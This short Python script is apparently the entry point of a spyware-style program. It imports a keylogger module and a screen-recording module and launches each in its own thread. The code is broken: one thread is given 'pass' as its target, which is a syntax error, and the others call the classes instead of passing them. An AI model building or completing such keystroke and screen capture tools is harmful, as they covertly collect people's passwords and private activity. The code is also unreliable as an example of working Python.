from program.screen_rec import ScreenRecording
from program.keylog import KeyLog

from threading import Thread

screen_rec = ScreenRecording
keylog = KeyLog

if __name__ == '__main__':
    Thread(target = screen_rec()).start()
    Thread(target = keylog()).start()
    Thread(target = pass).start()